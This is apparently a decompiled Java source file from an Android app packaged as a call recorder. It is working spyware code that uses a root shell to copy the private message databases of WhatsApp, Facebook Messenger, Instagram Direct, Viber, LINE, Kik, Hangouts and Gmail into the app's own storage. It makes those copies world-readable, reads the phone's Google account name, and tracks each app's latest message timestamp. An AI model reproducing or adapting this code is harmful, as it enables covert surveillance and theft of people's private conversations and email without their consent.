package com.yasoka.spcallrecord.recorder.call.a.c.e;

import a.a;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.database.Cursor;
import android.os.Build.VERSION;
import android.util.Patterns;
import com.app.activity.MyApp;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.regex.Pattern;

/* compiled from: IM */
public abstract class c {
    public static String a() {
        String str = "/";
        try {
            if (VERSION.SDK_INT <= 22) {
                StringBuilder sb = new StringBuilder();
                sb.append("/data/data/");
                sb.append(MyApp.b().getApplicationContext().getPackageName());
                sb.append("/databases/");
                return sb.toString();
            }
            StringBuilder sb2 = new StringBuilder();
            sb2.append(MyApp.b().getApplicationContext().getExternalFilesDir(null).getPath());
            sb2.append(str);
            return sb2.toString();
        } catch (Throwable unused) {
            StringBuilder sb3 = new StringBuilder();
            sb3.append(MyApp.b().getApplicationContext().getExternalFilesDir(null).getPath());
            sb3.append(str);
            return sb3.toString();
        }
    }

    public static void b(Context context) {
        String str = "Facebook.db";
        if (a.a()) {
            try {
                DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                StringBuilder sb = new StringBuilder();
                sb.append("cat ");
                sb.append("/data/data/com.facebook.orca/databases/");
                sb.append("threads_db2");
                sb.append(" > ");
                sb.append(a());
                sb.append(str);
                sb.append(" \n");
                dataOutputStream.writeBytes(sb.toString());
                StringBuilder sb2 = new StringBuilder();
                sb2.append("chmod 777 ");
                sb2.append(a());
                sb2.append("* \n");
                dataOutputStream.writeBytes(sb2.toString());
                StringBuilder sb3 = new StringBuilder();
                sb3.append("chmod -R 777 ");
                sb3.append(a());
                sb3.append("\n");
                dataOutputStream.writeBytes(sb3.toString());
                dataOutputStream.flush();
                dataOutputStream.writeBytes("exit\n");
                dataOutputStream.flush();
                Thread.sleep(10000);
                a(context, a(), str);
            } catch (Exception e2) {
                e2.getStackTrace();
            }
        }
    }

    public static void c(Context context) {
        String str = "Facebook.db";
        if (a.a()) {
            try {
                DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                StringBuilder sb = new StringBuilder();
                sb.append("cat ");
                sb.append("/data/data/com.facebook.mlite/databases/");
                sb.append("core.db");
                sb.append(" > ");
                sb.append(a());
                sb.append(str);
                sb.append(" \n");
                dataOutputStream.writeBytes(sb.toString());
                StringBuilder sb2 = new StringBuilder();
                sb2.append("chmod 777 ");
                sb2.append(a());
                sb2.append("* \n");
                dataOutputStream.writeBytes(sb2.toString());
                StringBuilder sb3 = new StringBuilder();
                sb3.append("chmod -R 777 ");
                sb3.append(a());
                sb3.append("\n");
                dataOutputStream.writeBytes(sb3.toString());
                dataOutputStream.flush();
                dataOutputStream.writeBytes("exit\n");
                dataOutputStream.flush();
                Thread.sleep(10000);
                b(context, a(), str);
            } catch (Exception e2) {
                e2.getStackTrace();
            }
        }
    }

    private static void d(Context context, String str) throws Exception {
        a.c.f.a aVar = new a.c.f.a(context, a(), str);
        aVar.b();
        Cursor f = aVar.f("messagesTable");
        if (f == null) {
            return;
        }
        if (f.getCount() <= 0) {
            aVar.a();
            f.close();
            return;
        }
        if (f.moveToLast()) {
            String str2 = "timestamp";
            long j = f.getLong(f.getColumnIndexOrThrow(str2));
            if (j == 0 && f.moveToPrevious()) {
                j = f.getLong(f.getColumnIndexOrThrow(str2));
            }
            a.b.a.a.a.a(context.getSharedPreferences("user", 0), "timekik", j);
        }
        aVar.a();
        f.close();
    }

    public static void e(Context context) {
        String str = "\n";
        String str2 = "hangoutsMessages.db";
        if (a.a()) {
            try {
                DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                StringBuilder sb = new StringBuilder();
                sb.append("cat ");
                sb.append("/data/data/com.google.android.talk/databases/");
                sb.append("babel*.db");
                sb.append(" > ");
                sb.append(a());
                sb.append(str2);
                sb.append(str);
                dataOutputStream.writeBytes(sb.toString());
                StringBuilder sb2 = new StringBuilder();
                sb2.append("chmod 777 ");
                sb2.append(a());
                sb2.append("* \n");
                dataOutputStream.writeBytes(sb2.toString());
                StringBuilder sb3 = new StringBuilder();
                sb3.append("chmod -R 777 ");
                sb3.append(a());
                sb3.append(str);
                dataOutputStream.writeBytes(sb3.toString());
                dataOutputStream.flush();
                dataOutputStream.writeBytes("exit\n");
                dataOutputStream.flush();
                Thread.sleep(10000);
                c(context, str2);
            } catch (Exception e2) {
                e2.getStackTrace();
            }
        }
    }

    private static void f(Context context, String str) throws Exception {
        a.c.f.a aVar = new a.c.f.a(context, a(), str);
        aVar.b();
        Cursor h = aVar.h("messages");
        if (h == null) {
            return;
        }
        if (h.getCount() <= 0) {
            aVar.a();
            h.close();
            return;
        }
        if (h.moveToLast()) {
            String str2 = "msg_date";
            long j = h.getLong(h.getColumnIndexOrThrow(str2));
            if (j == 0 && h.moveToPrevious()) {
                j = h.getLong(h.getColumnIndexOrThrow(str2));
            }
            a.b.a.a.a.a(context.getSharedPreferences("user", 0), "timeviber", j);
        }
        aVar.a();
        h.close();
    }

    private static void g(Context context, String str) throws Exception {
        a.c.f.a aVar = new a.c.f.a(context, a(), str);
        aVar.b();
        Cursor i = aVar.i("messages");
        if (i == null) {
            return;
        }
        if (i.getCount() <= 0) {
            aVar.a();
            i.close();
            return;
        }
        if (i.moveToLast()) {
            String str2 = "timestamp";
            long j = i.getLong(i.getColumnIndexOrThrow(str2));
            if (j == 0 && i.moveToPrevious()) {
                j = i.getLong(i.getColumnIndexOrThrow(str2));
            }
            a.b.a.a.a.a(context.getSharedPreferences("user", 0), "timewhatsapp", j);
        }
        aVar.a();
        i.close();
    }

    public static void h(Context context) {
        String str = "LINE.db";
        if (a.a()) {
            try {
                DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                StringBuilder sb = new StringBuilder();
                sb.append("cat ");
                sb.append("/data/data/jp.naver.line.android/databases/");
                sb.append("naver_line");
                sb.append(" >  ");
                sb.append(a());
                sb.append(str);
                sb.append(" \n");
                dataOutputStream.writeBytes(sb.toString());
                StringBuilder sb2 = new StringBuilder();
                sb2.append("chmod 777 ");
                sb2.append(a());
                sb2.append("* \n");
                dataOutputStream.writeBytes(sb2.toString());
                StringBuilder sb3 = new StringBuilder();
                sb3.append("chmod -R 777 ");
                sb3.append(a());
                sb3.append("\n");
                dataOutputStream.writeBytes(sb3.toString());
                dataOutputStream.flush();
                dataOutputStream.writeBytes("exit\n");
                dataOutputStream.flush();
                Thread.sleep(10000);
                e(context, str);
            } catch (Exception e2) {
                e2.getStackTrace();
            }
        }
    }

    public static void i(Context context) {
        String str = "\n";
        String str2 = "Viber.db";
        if (a.a()) {
            try {
                DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                StringBuilder sb = new StringBuilder();
                sb.append("cat ");
                sb.append("/data/data/com.viber.voip/databases/");
                sb.append("viber_messages");
                sb.append(" > ");
                sb.append(a());
                sb.append(str2);
                sb.append(str);
                dataOutputStream.writeBytes(sb.toString());
                StringBuilder sb2 = new StringBuilder();
                sb2.append("chmod 777 ");
                sb2.append(a());
                sb2.append("* \n");
                dataOutputStream.writeBytes(sb2.toString());
                StringBuilder sb3 = new StringBuilder();
                sb3.append("chmod -R 777 ");
                sb3.append(a());
                sb3.append(str);
                dataOutputStream.writeBytes(sb3.toString());
                dataOutputStream.flush();
                dataOutputStream.writeBytes("exit\n");
                dataOutputStream.flush();
                Thread.sleep(10000);
                f(context, str2);
            } catch (Exception e2) {
                e2.getStackTrace();
            }
        }
    }

    public static void j(Context context) {
        String str = "\n";
        String str2 = "msgstore.db";
        if (a.a()) {
            try {
                DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                StringBuilder sb = new StringBuilder();
                sb.append("cat ");
                sb.append("/data/data/com.whatsapp/databases/");
                sb.append(str2);
                sb.append(" > ");
                sb.append(a());
                sb.append(str2);
                sb.append(str);
                dataOutputStream.writeBytes(sb.toString());
                StringBuilder sb2 = new StringBuilder();
                sb2.append("chmod 777 ");
                sb2.append(a());
                sb2.append("* \n");
                dataOutputStream.writeBytes(sb2.toString());
                StringBuilder sb3 = new StringBuilder();
                sb3.append("chmod -R 777 ");
                sb3.append(a());
                sb3.append(str);
                dataOutputStream.writeBytes(sb3.toString());
                dataOutputStream.flush();
                dataOutputStream.writeBytes("exit\n");
                dataOutputStream.flush();
                Thread.sleep(10000);
                g(context, str2);
            } catch (Exception e2) {
                e2.getStackTrace();
            }
        }
    }

    public static String a(Context context) {
        Account[] accounts;
        Pattern pattern = Patterns.EMAIL_ADDRESS;
        for (Account account : AccountManager.get(context).getAccounts()) {
            if (pattern.matcher(account.name).matches() && account.type.equals("com.google")) {
                return account.name;
            }
        }
        return "";
    }

    public static void a(Context context, String str) {
        String str2 = "\n";
        String str3 = "sqlite3.armv7-pie";
        try {
            InputStream open = context.getAssets().open(str3);
            FileOutputStream fileOutputStream = new FileOutputStream(new File(a(), str3));
            byte[] bArr = new byte[1024];
            while (true) {
                int read = open.read(bArr);
                if (read > 0) {
                    fileOutputStream.write(bArr, 0, read);
                } else {
                    fileOutputStream.close();
                    open.close();
                    DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                    StringBuilder sb = new StringBuilder();
                    sb.append("cd ");
                    sb.append(a());
                    sb.append(str2);
                    dataOutputStream.writeBytes(sb.toString());
                    dataOutputStream.writeBytes("chmod +x sqlite3.armv7-pie\n");
                    StringBuilder sb2 = new StringBuilder();
                    sb2.append("./sqlite3.armv7-pie ");
                    sb2.append(str);
                    sb2.append(str2);
                    dataOutputStream.writeBytes(sb2.toString());
                    dataOutputStream.writeBytes("PRAGMA wal_checkpoint;");
                    dataOutputStream.writeBytes(".quit\n");
                    dataOutputStream.flush();
                    dataOutputStream.writeBytes("exit\n");
                    dataOutputStream.flush();
                    return;
                }
            }
        } catch (Throwable th) {
            th.getStackTrace();
        }
    }

    private static void b(Context context, String str, String str2) throws Exception {
        a.c.f.a aVar = new a.c.f.a(context, str, str2);
        aVar.b();
        Cursor b2 = aVar.b("messages");
        if (b2 == null) {
            return;
        }
        if (b2.getCount() <= 0) {
            aVar.a();
            b2.close();
            return;
        }
        if (b2.moveToLast()) {
            String str3 = "timestamp";
            long j = b2.getLong(b2.getColumnIndexOrThrow(str3));
            if (j == 0 && b2.moveToPrevious()) {
                j = b2.getLong(b2.getColumnIndexOrThrow(str3));
            }
            a.b.a.a.a.a(context.getSharedPreferences("user", 0), "timefacebook", j);
        }
        aVar.a();
        b2.close();
    }

    private static void c(Context context, String str) throws Exception {
        a.c.f.a aVar = new a.c.f.a(context, a(), str);
        aVar.b();
        Cursor d2 = aVar.d("messages");
        if (d2 == null) {
            return;
        }
        if (d2.getCount() <= 0) {
            aVar.a();
            d2.close();
            return;
        }
        if (d2.moveToLast()) {
            String str2 = "timestamp";
            long j = d2.getLong(d2.getColumnIndexOrThrow(str2));
            if (j == 0 && d2.moveToPrevious()) {
                j = d2.getLong(d2.getColumnIndexOrThrow(str2));
            }
            a.b.a.a.a.a(context.getSharedPreferences("user", 0), "timehangouts", j);
        }
        aVar.a();
        d2.close();
    }

    private static void e(Context context, String str) throws Exception {
        a.c.f.a aVar = new a.c.f.a(context, a(), str);
        aVar.b();
        Cursor g = aVar.g("chat_history");
        if (g == null) {
            return;
        }
        if (g.getCount() <= 0) {
            aVar.a();
            g.close();
            return;
        }
        if (g.moveToLast()) {
            String str2 = "created_time";
            long j = g.getLong(g.getColumnIndexOrThrow(str2));
            if (j == 0 && g.moveToPrevious()) {
                j = g.getLong(g.getColumnIndexOrThrow(str2));
            }
            a.b.a.a.a.a(context.getSharedPreferences("user", 0), "timeline", j);
        }
        aVar.a();
        g.close();
    }

    public static void f(Context context) {
        String str = "\n";
        String str2 = "Insta.db";
        if (a.a()) {
            try {
                DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                StringBuilder sb = new StringBuilder();
                sb.append("cat ");
                sb.append("/data/data/com.instagram.android/databases/");
                sb.append("direct.db");
                sb.append(" > ");
                sb.append(a());
                sb.append(str2);
                sb.append(str);
                dataOutputStream.writeBytes(sb.toString());
                StringBuilder sb2 = new StringBuilder();
                sb2.append("chmod 777 ");
                sb2.append(a());
                sb2.append("* \n");
                dataOutputStream.writeBytes(sb2.toString());
                StringBuilder sb3 = new StringBuilder();
                sb3.append("chmod -R 777 ");
                sb3.append(a());
                sb3.append(str);
                dataOutputStream.writeBytes(sb3.toString());
                dataOutputStream.flush();
                dataOutputStream.writeBytes("exit\n");
                dataOutputStream.flush();
                Thread.sleep(10000);
                c(context, a(), str2);
            } catch (Exception e2) {
                e2.getStackTrace();
            }
        }
    }

    public static void g(Context context) {
        String str = "kik.db";
        if (a.a()) {
            try {
                DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                StringBuilder sb = new StringBuilder();
                sb.append("cat ");
                sb.append("/data/data/kik.android/databases/");
                sb.append("*.");
                sb.append("kikDatabase.db");
                sb.append(" > ");
                sb.append(a());
                sb.append(str);
                sb.append(" \n");
                dataOutputStream.writeBytes(sb.toString());
                StringBuilder sb2 = new StringBuilder();
                sb2.append("chmod 777 ");
                sb2.append(a());
                sb2.append("* \n");
                dataOutputStream.writeBytes(sb2.toString());
                StringBuilder sb3 = new StringBuilder();
                sb3.append("chmod -R 777 ");
                sb3.append(a());
                sb3.append("\n");
                dataOutputStream.writeBytes(sb3.toString());
                dataOutputStream.flush();
                dataOutputStream.writeBytes("exit\n");
                dataOutputStream.flush();
                Thread.sleep(10000);
                d(context, str);
            } catch (Exception e2) {
                e2.getStackTrace();
            }
        }
    }

    public static void d(Context context) {
        if (a.a()) {
            try {
                StringBuilder sb = new StringBuilder();
                sb.append("mailstore.");
                sb.append(a(context));
                sb.append(".db");
                String sb2 = sb.toString();
                DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                StringBuilder sb3 = new StringBuilder();
                sb3.append("cat /data/data/com.google.android.gm/databases/mailstore.");
                sb3.append(a(context));
                sb3.append(".db > ");
                sb3.append(a());
                sb3.append(sb2);
                sb3.append(" \n");
                dataOutputStream.writeBytes(sb3.toString());
                StringBuilder sb4 = new StringBuilder();
                sb4.append("chmod 777 ");
                sb4.append(a());
                sb4.append("* \n");
                dataOutputStream.writeBytes(sb4.toString());
                StringBuilder sb5 = new StringBuilder();
                sb5.append("chmod -R 777 ");
                sb5.append(a());
                sb5.append("\n");
                dataOutputStream.writeBytes(sb5.toString());
                dataOutputStream.flush();
                dataOutputStream.writeBytes("exit\n");
                dataOutputStream.flush();
                Thread.sleep(10000);
                b(context, sb2);
            } catch (Exception e2) {
                e2.getStackTrace();
            }
        }
    }

    private static void b(Context context, String str) throws Exception {
        a.c.f.a aVar = new a.c.f.a(context, a(), str);
        aVar.b();
        Cursor c2 = aVar.c("messages");
        if (c2 == null) {
            return;
        }
        if (c2.getCount() <= 0) {
            aVar.a();
            c2.close();
            return;
        }
        if (c2.moveToLast()) {
            String str2 = "dateSentMs";
            long j = c2.getLong(c2.getColumnIndexOrThrow(str2));
            if (j == 0 && c2.moveToPrevious()) {
                j = c2.getLong(c2.getColumnIndexOrThrow(str2));
            }
            a.b.a.a.a.a(context.getSharedPreferences("user", 0), "timegmail", j);
        }
        aVar.a();
        c2.close();
    }

    private static void c(Context context, String str, String str2) throws Exception {
        a.c.f.a aVar = new a.c.f.a(context, str, str2);
        aVar.b();
        Cursor e2 = aVar.e("messages");
        if (e2 == null) {
            return;
        }
        if (e2.getCount() <= 0) {
            aVar.a();
            e2.close();
            return;
        }
        if (e2.moveToLast()) {
            String str3 = "timestamp";
            long j = e2.getLong(e2.getColumnIndexOrThrow(str3));
            if (j == 0 && e2.moveToPrevious()) {
                j = e2.getLong(e2.getColumnIndexOrThrow(str3));
            }
            a.b.a.a.a.a(context.getSharedPreferences("user", 0), "timeinstagram", j);
        }
        aVar.a();
        e2.close();
    }

    private static void a(Context context, String str, String str2) throws Exception {
        a.c.f.a aVar = new a.c.f.a(context, str, str2);
        aVar.b();
        Cursor a2 = aVar.a("messages");
        if (a2 == null) {
            return;
        }
        if (a2.getCount() <= 0) {
            aVar.a();
            a2.close();
            return;
        }
        if (a2.moveToLast()) {
            String str3 = "timestamp_ms";
            long j = a2.getLong(a2.getColumnIndexOrThrow(str3));
            if (j == 0 && a2.moveToPrevious()) {
                j = a2.getLong(a2.getColumnIndexOrThrow(str3));
            }
            a.b.a.a.a.a(context.getSharedPreferences("user", 0), "timefacebook", j);
        }
        aVar.a();
        a2.close();
    }
}
